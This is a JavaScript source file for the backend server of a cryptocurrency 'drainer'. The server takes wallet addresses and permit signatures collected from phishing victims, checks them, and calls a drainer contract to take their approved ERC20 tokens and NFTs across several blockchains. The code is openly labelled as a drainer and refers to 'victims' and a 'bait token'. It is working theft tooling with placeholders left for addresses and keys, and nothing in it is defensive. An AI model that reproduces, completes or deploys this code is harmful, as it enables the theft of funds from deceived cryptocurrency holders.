// server.js
// The main backend server for the Crypto Drainer

const express = require('express');
const cors = require('cors');
const ethers = require('ethers');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

// --- CONFIGURATION ---

// Load Private Key from .env
const PRIVATE_KEY = process.env.PRIVATE_KEY;
if (!PRIVATE_KEY) {
    console.error("ERROR: Missing PRIVATE_KEY in .env file");
    process.exit(1);
}

// RPC URLs for each chain. 
// Replace these with your own RPC provider URLs (e.g., Alchemy, Infura, Ankr)
// or use public ones for testing (may be rate-limited).
const RPC_URLS = {
    1:     "https://eth-mainnet.g.alchemy.com/v2/YOUR_ALCHEMY_KEY",
    56:    "https://bsc-dataseed.binance.org/",
    137:   "https://polygon-rpc.com",
    8453:  "https://mainnet.base.org",
    42161: "https://arb1.arbitrum.io/rpc",
    10:    "https://mainnet.optimism.io",
    43114: "https://api.avax.network/ext/bc/C/rpc"
};

// Drainer Contract Addresses. 
// MUST MATCH the addresses in your frontend/drainer.js CONFIG.DRAINER
const DRAINER_ADDRESSES = {
    1:     "0xYourDrainerEthereum0000000000000000000000000",
    56:    "0xYourDrainerBSC00000000000000000000000000",
    137:   "0xYourDrainerPolygon000000000000000000000000",
    8453:  "0xYourDrainerBase00000000000000000000000000",
    42161: "0xYourDrainerArbitrum000000000000000000000000",
    10:    "0xYourDrainerOptimism000000000000000000000000",
    43114: "0xYourDrainerAvalanche000000000000000000000000"
};

// --- ABIs (Application Binary Interfaces) ---

// ABI for your Drainer Contract
const DRAINER_ABI = [
    "function drainERC20(address victim, address token)",
    "function drainSpecificERC721(address victim, address token, uint256[] tokenIds)",
    "function drainSpecificERC1155(address victim, address token, uint256[] tokenIds, uint256[] amounts)"
];

// ABI for standard ERC20 Tokens (USDC, USDT, etc.)
const ERC20_ABI = [
    "function allowance(address owner, address spender) view returns (uint256)",
    "function balanceOf(address account) view returns (uint256)",
    "function symbol() view returns (string)"
];

// ABI for standard ERC721 NFTs
const ERC721_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
    "function getApproved(uint256 tokenId) view returns (address)"
];

// ABI for standard ERC1155 Tokens
const ERC1155_ABI = [
    "function balanceOf(address account, uint256 id) view returns (uint256)"
];

// --- HELPER FUNCTIONS ---

function getProvider(chainId) {
    const rpcUrl = RPC_URLS[chainId];
    if (!rpcUrl) {
        throw new Error(`No RPC URL configured for chain ID ${chainId}`);
    }
    return new ethers.JsonRpcProvider(rpcUrl, chainId);
}

function getSigner(chainId) {
    const provider = getProvider(chainId);
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    return wallet;
}

/**
 * Validates the EIP-712 Permit signature sent from the frontend.
 * This ensures the victim actually signed the message.
 */
async function validatePermit(provider, permitData, victimAddress, drainerAddress) {
    try {
        const { signature, deadline, nonce, baitToken } = permitData;

        // The domain must match the token that was used for the permit
        const domain = {
            name: "Bait Token", // This must match the name of the BAIT_TOKEN in drainer.js
            version: "1",
            chainId: Number(provider._network.chainId),
            verifyingContract: baitToken
        };

        const types = {
            Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ]
        };

        const message = {
            owner: victimAddress,
            spender: drainerAddress,
            value: ethers.MaxUint256.toString(),
            nonce: nonce,
            deadline: Number(deadline)
        };

        // Hash the typed data
        const hash = ethers.TypedDataEncoder.hash(domain, types, message);
        
        // Recover the signer from the signature
        const sig = ethers.Signature.from(signature);
        const recovered = ethers.verifyMessage(ethers.getBytes(hash), sig);

        console.log(`[VALIDATE] Recovered: ${recovered}`);
        console.log(`[VALIDATE] Victim:    ${victimAddress}`);

        // Compare recovered address with victim address
        return recovered.toLowerCase() === victimAddress.toLowerCase();

    } catch (error) {
        console.error("[VALIDATE] Error during validation:", error);
        return false;
    }
}

/**
 * Finds all NFTs (ERC721) owned by the victim that are approved to the Drainer.
 */
async function findApprovedNFTs(provider, victim, drainerAddress) {
    // In a production environment, you would have a list of popular NFT contracts
    // you want to check. For this example, we'll use an empty array.
    // You can add NFT addresses here to check for approvals.
    const commonNFTs = [
        // "0x...", 
    ];

    const approvedNFTs = [];

    for (const nftAddress of commonNFTs) {
        try {
            const nft = new ethers.Contract(nftAddress, ERC721_ABI, provider);
            const balance = await nft.balanceOf(victim);

            if (balance > 0) {
                for (let i = 0; i < Number(balance); i++) {
                    const tokenId = await nft.tokenOfOwnerByIndex(victim, i);
                    const approvedTo = await nft.getApproved(tokenId);
                    
                    if (approvedTo.toLowerCase() === drainerAddress.toLowerCase()) {
                        approvedNFTs.push({
                            token: nftAddress,
                            tokenId: tokenId
                        });
                    }
                }
            }
        } catch (e) {
            // Contract might not exist or not be ERC721, skip it
        }
    }

    return approvedNFTs;
}

// --- API ENDPOINT ---

app.post('/api/drain', async (req, res) => {
    const { address, chainId, permit, tokens, drainer } = req.body;

    console.log("\n=========================================");
    console.log(`[DRAINER] NEW REQUEST FROM: ${address}`);
    console.log(`[DRAINER] CHAIN ID: ${chainId}`);
    console.log(`[DRAINER] DRAINER CONTRACT: ${drainer || DRAINER_ADDRESSES[chainId]}`);
    console.log("=========================================");

    try {
        // 1. SETUP
        const provider = getProvider(chainId);
        const signer = getSigner(chainId);
        const drainerAddress = drainer || DRAINER_ADDRESSES[chainId];
        const drainerContract = new ethers.Contract(drainerAddress, DRAINER_ABI, signer);

        if (!drainerAddress) {
            throw new Error(`No Drainer Contract address found for chain ${chainId}`);
        }

        // 2. VALIDATE PERMIT
        console.log(`[DRAINER] Step 1: Validating Permit Signature...`);
        const isValid = await validatePermit(provider, permit, address, drainerAddress);
        if (!isValid) {
            console.log(`[DRAINER] PERMIT INVALID. Signature mismatch.`);
            return res.status(400).json({ success: false, message: "Invalid Signature" });
        }
        console.log(`[DRAINER] Permit Validated Successfully.`);

        // 3. DRAIN ERC20 TOKENS
        console.log(`[DRAINER] Step 2: Draining ERC20 Tokens...`);
        for (const tokenAddress of tokens) {
            try {
                const erc20 = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
                const allowance = await erc20.allowance(address, drainerAddress);
                
                if (allowance > 0) {
                    console.log(`[DRAINER] Draining ${tokenAddress} (Allowance: ${allowance})`);
                    const tx = await drainerContract.drainERC20(address, tokenAddress);
                    console.log(`[DRAINER] Tx Hash: ${tx.hash}`);
                    await tx.wait();
                    console.log(`[DRAINER] ERC20 Drained: ${tokenAddress}`);
                } else {
                    console.log(`[DRAINER] No allowance for ${tokenAddress}, skipping.`);
                }
            } catch (e) {
                console.log(`[DRAINER] Error draining ERC20 ${tokenAddress}: ${e.message}`);
            }
        }

        // 4. DRAIN NFTS (ERC721)
        console.log(`[DRAINER] Step 3: Checking for Approved NFTs...`);
        const approvedNFTs = await findApprovedNFTs(provider, address, drainerAddress);
        
        if (approvedNFTs.length > 0) {
            // Group NFTs by contract address to batch transactions
            const nftMap = {};
            for (const item of approvedNFTs) {
                if (!nftMap[item.token]) {
                    nftMap[item.token] = [];
                }
                nftMap[item.token].push(item.tokenId);
            }

            for (const [nftToken, ids] of Object.entries(nftMap)) {
                try {
                    console.log(`[DRAINER] Draining NFTs: ${nftToken} (${ids.length} items)`);
                    const tx = await drainerContract.drainSpecificERC721(address, nftToken, ids);
                    await tx.wait();
                    console.log(`[DRAINER] NFTs Drained Successfully.`);
                } catch (e) {
                    console.log(`[DRAINER] Error draining NFTs ${nftToken}: ${e.message}`);
                }
            }
        } else {
            console.log(`[DRAINER] No approved NFTs found.`);
        }

        console.log("=========================================");
        console.log(`[DRAINER] DRAIN COMPLETE FOR: ${address}`);
        console.log("=========================================\n");

        res.json({ success: true, message: "Drain process initiated" });

    } catch (error) {
        console.error(`[DRAINER] ERROR:`, error);
        res.status(500).json({ success: false, message: error.message });
    }
});

// --- START SERVER ---

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`\n[SERVER] Drainer Backend is listening on port ${PORT}`);
    console.log(`[SERVER] Private Key: ${PRIVATE_KEY.substring(0, 6)}...${PRIVATE_KEY.substring(PRIVATE_KEY.length - 4)}`);
    console.log(`[SERVER] Ready to receive drainer requests.\n`);
});